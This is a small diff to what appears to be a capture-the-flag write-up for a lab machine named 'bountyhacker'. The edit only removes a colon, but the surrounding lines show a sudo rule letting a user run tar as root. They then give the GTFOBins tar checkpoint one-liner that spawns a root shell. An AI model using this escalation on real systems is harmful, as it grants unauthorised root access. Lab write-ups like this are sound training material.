@@ -78,7 +78,7 @@ User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ``` 
 <br>
-There is a privesc with it on gtfobins so it's an easy win : <br>
+There is a privesc with it on gtfobins so it's an easy win <br>
 ``sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ``
 <br>
